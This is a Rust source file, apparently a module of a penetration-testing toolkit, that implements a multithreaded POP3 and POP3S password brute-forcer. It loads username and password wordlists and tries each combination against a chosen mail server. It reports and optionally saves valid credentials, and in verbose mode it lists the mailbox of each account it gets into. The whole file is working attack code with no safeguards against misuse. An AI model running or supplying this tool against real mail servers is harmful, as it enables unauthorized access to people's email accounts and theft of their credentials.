use anyhow::{Result, Context};
use regex::Regex;
use std::fs::{File, OpenOptions};
use std::io::{self, BufRead, BufReader, Write, Read};
use std::net::{TcpStream, ToSocketAddrs};
use std::sync::{Arc, Mutex};
use std::time::Duration;
use threadpool::ThreadPool;
use crossbeam_channel::unbounded;
use native_tls::TlsConnector;

#[derive(Clone)]
struct Pop3BruteforceConfig {
    target: String,
    port: u16,
    username_wordlist: String,
    password_wordlist: String,
    threads: usize,
    stop_on_success: bool,
    verbose: bool,
    full_combo: bool,
    use_ssl: bool,
}

pub async fn run(target: &str) -> Result<()> {
    println!("\n=== POP3 Bruteforce ===\n");
    let port = prompt("Port (default 110 for POP3, 995 for POP3S): ").parse().unwrap_or(110);
    let username_wordlist = prompt("Username wordlist file: ");
    let password_wordlist = prompt("Password wordlist file: ");
    let threads = prompt("Threads (default 16): ").parse().unwrap_or(16);
    let stop_on_success = prompt("Stop on first valid login? (y/n): ").trim().eq_ignore_ascii_case("y");
    let full_combo = prompt("Try all combos? (y/n): ").trim().eq_ignore_ascii_case("y");
    let verbose = prompt("Verbose? (y/n): ").trim().eq_ignore_ascii_case("y");
    let use_ssl = prompt("Use SSL/TLS (POP3S)? (y/n): ").trim().eq_ignore_ascii_case("y");
    let config = Pop3BruteforceConfig {
        target: target.to_string(),
        port,
        username_wordlist,
        password_wordlist,
        threads,
        stop_on_success,
        verbose,
        full_combo,
        use_ssl,
    };
    run_pop3_bruteforce(config)
}

fn run_pop3_bruteforce(config: Pop3BruteforceConfig) -> Result<()> {
    let addr = normalize_target(&config.target, config.port)?;
    let host = get_hostname(&config.target);
    let usernames = read_lines(&config.username_wordlist)?;
    let passwords = read_lines(&config.password_wordlist)?;
    if usernames.is_empty() || passwords.is_empty() {
        return Err(anyhow::anyhow!("Empty user or pass wordlist."));
    }
    let found = Arc::new(Mutex::new(Vec::new()));
    let stop_flag = Arc::new(Mutex::new(false));
    let pool = ThreadPool::new(config.threads);
    let (tx, rx) = unbounded();
    if config.full_combo {
        for u in &usernames { for p in &passwords { tx.send((u.clone(), p.clone()))?; } }
    } else if usernames.len() == 1 {
        for p in &passwords { tx.send((usernames[0].clone(), p.clone()))?; }
    } else if passwords.len() == 1 {
        for u in &usernames { tx.send((u.clone(), passwords[0].clone()))?; }
    } else {
        for p in &passwords { tx.send((usernames[0].clone(), p.clone()))?; }
    }
    drop(tx);
    for _ in 0..config.threads {
        let rx = rx.clone();
        let addr = addr.clone();
        let host = host.clone();
        let stop_flag = Arc::clone(&stop_flag);
        let found = Arc::clone(&found);
        let config = config.clone();
        pool.execute(move || {
            while let Ok((user, pass)) = rx.recv() {
                if *stop_flag.lock().unwrap() { break; }
                if config.verbose { println!("[*] Trying {}:{}", user, pass); }
                let result = if config.use_ssl {
                    try_pop3s_login_verbose(&addr, &host, &user, &pass, config.verbose)
                } else {
                    try_pop3_login_verbose(&addr, &user, &pass, config.verbose)
                };
                match result {
                    Ok(true) => {
                        println!();
                        println!("[+] VALID: {}:{}", user, pass);
                        let mut creds = found.lock().unwrap(); creds.push((user.clone(), pass.clone()));
                        if config.stop_on_success {
                            *stop_flag.lock().unwrap() = true;
                            while rx.try_recv().is_ok() {}
                            break;
                        }
                    }
                    Ok(false) => {}
                    Err(e) => if config.verbose { eprintln!("[!] {}:{}: {}", user, pass, e); },
                }
            }
        });
    }
    pool.join();
    let found = found.lock().unwrap();
    if found.is_empty() {
        println!("[-] No valid credentials.");
    } else {
        println!();
        println!("[+] Found:");
        for (u,p) in found.iter() { println!("{}:{}", u, p); }
        if prompt("Save found? (y/n): ").trim().eq_ignore_ascii_case("y") {
            let f = prompt("Filename: ");
            save_results(&f, &found)?;
            println!("[+] Saved to {}", f);
        }
    }
    Ok(())
}

// Standard POP3 login, plaintext
fn try_pop3_login_verbose(addr: &str, username: &str, password: &str, verbose: bool) -> Result<bool> {
    let socket = addr.to_socket_addrs()?.next().ok_or_else(|| anyhow::anyhow!("Could not resolve address"))?;
    let mut stream = TcpStream::connect_timeout(&socket, Duration::from_millis(4000)).context("Connect timeout")?;
    stream.set_read_timeout(Some(Duration::from_millis(4000))).ok();
    stream.set_write_timeout(Some(Duration::from_millis(4000))).ok();
    pop3_session(&mut stream, username, password, verbose)
}

// POP3S (SSL/TLS)
fn try_pop3s_login_verbose(addr: &str, host: &str, username: &str, password: &str, verbose: bool) -> Result<bool> {
    let socket = addr.to_socket_addrs()?.next().ok_or_else(|| anyhow::anyhow!("Could not resolve address"))?;
    let stream = TcpStream::connect_timeout(&socket, Duration::from_millis(4000)).context("Connect timeout")?;
    let connector = TlsConnector::new().unwrap();
    let mut stream = connector.connect(host, stream).context("SSL connect fail")?;
    stream.get_ref().set_read_timeout(Some(Duration::from_millis(4000))).ok();
    stream.get_ref().set_write_timeout(Some(Duration::from_millis(4000))).ok();
    pop3_session(&mut stream, username, password, verbose)
}

// Shared POP3 session logic for both plain and SSL
fn pop3_session<S: Read + Write>(stream: &mut S, username: &str, password: &str, verbose: bool) -> Result<bool> {
    let mut buf = [0u8; 4096];
    // Banner
    let n = stream.read(&mut buf)?;
    let banner = String::from_utf8_lossy(&buf[..n]);
    if verbose { print!("-> {}\n", banner.trim_end()); }
    if !banner.to_ascii_lowercase().contains("+ok") {
        return Err(anyhow::anyhow!("No +OK banner: {}", banner));
    }
    // USER
    let user_cmd = format!("USER {}\r\n", username);
    stream.write_all(user_cmd.as_bytes())?;
    if verbose { print!("<- {}", user_cmd); }
    let n = stream.read(&mut buf)?;
    let resp = String::from_utf8_lossy(&buf[..n]);
    if verbose { print!("-> {}\n", resp.trim_end()); }
    if !resp.to_ascii_lowercase().contains("+ok") {
        return Ok(false);
    }
    // PASS
    let pass_cmd = format!("PASS {}\r\n", password);
    stream.write_all(pass_cmd.as_bytes())?;
    if verbose { print!("<- {}", pass_cmd); }
    let n = stream.read(&mut buf)?;
    let resp = String::from_utf8_lossy(&buf[..n]);
    if verbose { print!("-> {}\n", resp.trim_end()); }
    // Hardened login detection:
    let reply = resp.to_ascii_lowercase();
    if reply.contains("+ok")
        && !reply.contains("error")
        && !reply.contains("fail")
        && !reply.contains("denied")
        && !reply.contains("invalid")
        && !reply.contains("authentication required")
        && !reply.contains("locked") {
        // Only consider true success if reply says +OK and has no error/fail/invalid/denied
        if verbose {
            stream.write_all(b"STAT\r\n").ok();
            let n = stream.read(&mut buf).unwrap_or(0);
            if n > 0 { print!("-> {}\n", String::from_utf8_lossy(&buf[..n]).trim_end()); }
            stream.write_all(b"LIST\r\n").ok();
            let n = stream.read(&mut buf).unwrap_or(0);
            if n > 0 { print!("-> {}\n", String::from_utf8_lossy(&buf[..n]).trim_end()); }
            stream.write_all(b"QUIT\r\n").ok();
            let n = stream.read(&mut buf).unwrap_or(0);
            if n > 0 { print!("-> {}\n", String::from_utf8_lossy(&buf[..n]).trim_end()); }
        } else {
            stream.write_all(b"QUIT\r\n").ok();
        }
        return Ok(true);
    }
    Ok(false)
}

fn read_lines(path: &str) -> Result<Vec<String>> {
    let file = File::open(path).context(format!("Open: {}", path))?;
    Ok(BufReader::new(file).lines().filter_map(Result::ok).filter(|s|!s.trim().is_empty()).collect())
}

fn save_results(path: &str, creds: &[(String, String)]) -> Result<()> {
    let mut file = OpenOptions::new().create(true).write(true).truncate(true).open(path)?;
    for (u,p) in creds { writeln!(file, "{}:{}", u, p)?; }
    Ok(())
}

fn prompt(msg: &str) -> String {
    print!("{}", msg); io::stdout().flush().unwrap(); let mut b = String::new(); io::stdin().read_line(&mut b).unwrap(); b.trim().to_string()
}

fn normalize_target(host: &str, port: u16) -> Result<String> {
    let re = Regex::new(r"^\[*([^\]]+?)\]*(?::(\d{1,5}))?$" ).unwrap();
    let t = host.trim();
    let cap = re.captures(t).ok_or_else(|| anyhow::anyhow!("Invalid target: {}", host))?;
    let addr = cap.get(1).unwrap().as_str();
    let p = cap.get(2).map(|m| m.as_str().parse::<u16>().ok()).flatten().unwrap_or(port);
    let f = if addr.contains(':') && !addr.starts_with('[') { format!("[{}]:{}", addr, p) } else { format!("{}:{}", addr, p) };
    if f.to_socket_addrs()?.next().is_none() { Err(anyhow::anyhow!("DNS fail: {}", f)) } else { Ok(f) }
}

fn get_hostname(target: &str) -> String {
    if let Some(idx) = target.find(':') { target[..idx].trim_matches('[').trim_matches(']').to_string() } else { target.trim_matches('[').trim_matches(']').to_string() }
}
